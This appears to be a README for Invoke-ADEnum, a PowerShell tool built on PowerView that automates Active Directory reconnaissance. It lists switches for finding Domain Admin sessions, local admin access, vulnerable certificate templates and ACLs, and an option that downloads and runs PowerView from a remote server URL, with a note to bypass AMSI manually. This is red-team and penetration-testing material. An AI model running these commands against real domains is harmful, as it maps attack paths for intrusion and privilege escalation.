# Invoke-ADEnum
Automate Active Directory Enumeration

Required Dependencies: PowerView

PARAMETERS:

`-Domain <domain FQDN>`           The Domain to enumerate for. If not specified, the tool will enumerate for all the domains it can find

`-Server <DC FQDN or IP>`         The DC to bind to (requires you specify a Domain)

`-Output <path-on-disk>`          Specify where to save the output from the tool (default is pwd)         `-Output C:\Windows\Temp\Invoke-ADEnum.txt`

`-Exclude <domain FQDN>`          Exclude one or more domains from enumeration                            `-Exclude contoso.local,ad.example.org`

`-CustomURL <URL>`                Specify the Server URL where you're hosting PowerView.ps1               `-CustomURL http://yourserver.com/Tools/PowerView.ps1`

`-Local <path-on-disk>`           Specify the local path to PowerView.ps1                                 `-Local c:\Windows\Temp\PowerView.ps1`


+++> NOTE: If you use -CustomURL or -Local parameters you'll have to bypass AMSI manually <+++


SWITCHES:

-TargetsOnly                    Show only Target Domains

-NoServers                      Do not enumerate for Servers

-Workstations                   Enumerate for Workstations

-NoUnsupportedOS                Do not enumerate for machines running unsupported OS

-DomainUsers                    Enumerate for Users

-Shares                         Enumerate for Shares

-FindLocalAdminAccess           Enumerate for Machines where the Current User is Local Admin

-DomainACLs                     Enumerate for Domain ACLs

-NoGPOs                         Do not enumerate for GPOs and Who can Modify/Link them

-MoreGPOs                       More enumeration leveraging GPOs

-NoLAPS                         Do not enumerate for LAPS GPO

-NoAppLocker                    Do not enumerate for AppLocker GPO

-NoVulnCertTemplates            Do not enumerate for Misconfigured Certificate Templates

-DomainOUs                      Enumerate for Organizational Units

-MoreOUs                        More enumeration leveraging Organizational Units

-FindDomainUserLocation         Enumerate for Machines where Domain Admins are Logged into

-AllGroups                      Enumerate for All Domain Groups

-Help                           Show the Help page


EXAMPLES:

```
Invoke-ADEnum
```
```
Invoke-ADEnum -TargetsOnly -Local C:\Users\m.seitz\Downloads\PowerView.ps1
```
```
Invoke-ADEnum -Domain contoso.local -Server DC01.contoso.local
```
```
Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
```
```
Invoke-ADEnum -Exclude contoso.local,domain.local -NoVulnCertTemplates
```
```
Invoke-ADEnum -CustomURL http://yourserver.com/Tools/PowerView.ps1
```


FULL ENUMERATION: (may take a long time)
```
Invoke-ADEnum -Workstations -DomainUsers -Shares -FindLocalAdminAccess -DomainACLs -MoreGPOs -DomainOUs -MoreOUs -FindDomainUserLocation -AllGroups
```

![image](https://user-images.githubusercontent.com/61951374/236856792-c7c3f17d-a8a5-41d5-8c69-613fd15fd845.png)
